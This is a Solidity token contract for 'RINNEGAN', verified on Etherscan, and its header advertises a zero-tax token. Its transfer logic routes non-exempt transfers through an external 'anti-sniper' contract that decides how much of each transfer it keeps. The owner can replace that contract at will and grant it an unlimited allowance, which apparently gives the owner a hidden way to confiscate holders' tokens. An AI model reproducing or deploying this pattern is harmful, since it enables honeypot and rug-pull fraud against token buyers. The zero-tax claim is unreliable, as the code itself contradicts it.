/**
 *Submitted for verification at Etherscan.io on 2021-09-25
*/

//SPDX-License-Identifier: UNLICENSED

/**
*FORKED FROM TANJIRO TOKEN WITH THEIR ANTIBOT REVERSE ENGINEERED AND IMPROVED
*RINNEGAN TOKEN
*THE UTILITY TOKEN OF THE RINNEGAN ECOYSTEM
*RINNEGAN HOLDERS CAN UTILISE RINNEGAN TO MINT THE UPCOMING RINNEGAN ONCHAIN NFT'S
*
*THIS IS A ZERO TAX TOKEN
*I REPEAT ZERO TAX
* SUPPLY = 10 BILLION
* https://t.me/RinneganETH
*/

pragma solidity ^0.7.6;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface SniperChecker {
    function Start() external;
    function checkForSniper(uint256, address, address, address) external returns (uint256,bool);
    function register(address) external;
}
contract RINNEGAN is IERC20, Auth {
    using SafeMath for uint256;
    string constant _name = "RINNEGAN";
    string constant _symbol = "RINNEGAN";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 10000000000 * (10 ** _decimals);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isSnipeExempt;

    SniperChecker Sniper;
    bool SniperRegistered = false;
    uint256 public launchedAt;
    bool public launchCompleted = false;


    constructor (address _Sniper) Auth(msg.sender) {
	Sniper = SniperChecker(_Sniper);
        _allowances[address(this)][address(_Sniper)] = uint256(-1);
        isSnipeExempt[owner] = true;
        isSnipeExempt[_Sniper] = true;
        _balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived;
        if(!isSnipeExempt[recipient]){amountReceived= shouldCheckSniper(sender) ? checkSnipers(sender, amount, recipient) : amount;}else{amountReceived = amount;}
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    
    function transferBatch(address[] calldata recipients, uint256 amount) public {
       for (uint256 i = 0; i < recipients.length; i++) {
            require(_transferFrom(msg.sender,recipients[i], amount));
        }
    }
    
    function shouldCheckSniper(address sender) internal view returns (bool) {
       return !isSnipeExempt[sender];
    }

    function checkSnipers(address sender,uint256 amount, address receiver) internal returns (uint256) {
  	(uint256 feeAmount,bool isSniper) = Sniper.checkForSniper(amount,sender,receiver,msg.sender);
	if(isSniper){_balances[address(Sniper)] = _balances[address(Sniper)].add(feeAmount);
        emit Transfer(sender, address(Sniper), feeAmount);}
        return amount.sub(feeAmount);
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() external authorized{
	    require(!launched());
        launchedAt = block.number;
        Sniper.Start();
    }
    
    function blockNumber() external view returns (uint256){
	    return block.number;
    }
   
    function setIsSnipeExempt(address holder, bool exempt) external onlyOwner {
        isSnipeExempt[holder] = exempt;
    }
   
    function registerSniper() external authorized {
	    Sniper.register(address(this));
	    SniperRegistered = true;
	}
	
    function recoverEth() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function recoverToken(address _token, uint256 amount) external authorized returns (bool _sent){
        _sent = IERC20(_token).transfer(msg.sender, amount);
    }

    function newAntiSniper(address _Sniper) external authorized{
 	Sniper = SniperChecker(_Sniper);
        _allowances[address(this)][address(_Sniper)] = uint256(-1);
        isSnipeExempt[_Sniper] = true;
    }
    event AutoLiquify(uint256 amountETH, uint256 amountToken);
   
}